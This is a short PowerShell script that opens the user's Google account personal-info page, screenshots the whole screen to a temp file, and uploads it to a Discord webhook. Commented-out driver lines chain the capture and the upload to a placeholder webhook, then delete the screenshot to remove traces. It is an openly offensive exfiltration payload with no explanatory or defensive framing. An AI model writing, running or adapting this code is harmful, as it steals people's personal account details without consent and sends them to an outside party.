function Get-EmailInfo {
    param (
        [string]$targetURL = "https://myaccount.google.com/personal-info?hl=en"
    )

    Start-Process $targetURL

    Start-Sleep -Seconds 3

    $fileName = "CaliShot.png"
    $screenshotPath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), $fileName)

    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing

    $screenBounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $screenshot = New-Object System.Drawing.Bitmap $screenBounds.Width, $screenBounds.Height
    $graphics = [System.Drawing.Graphics]::FromImage($screenshot)
    $graphics.CopyFromScreen($screenBounds.Location, [System.Drawing.Point]::Empty, $screenBounds.Size)

    $screenshot.Save($screenshotPath, [System.Drawing.Imaging.ImageFormat]::Png)


    return $screenshotPath
}

function Upload-Discord {
    param (
        [string]$file,
        [string]$text,
        [string]$webhookUrl
    )

    if ($text) {
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $webhookUrl -Method Post -Body @{ 'username' = $env:username; 'content' = $text }
    }
    elseif ($file) {
        (New-Object Net.WebClient).UploadFile($webhookUrl, $file)
    }
}

#$filePath = Get-EmailInfo
#Upload-Discord -webhookUrl 'YOUR DISCORD WEBHOOK HERE' -file $filePath | Out-Null

# Delete the screenshot file after uploading
#Remove-Item -Path $filePath -Force
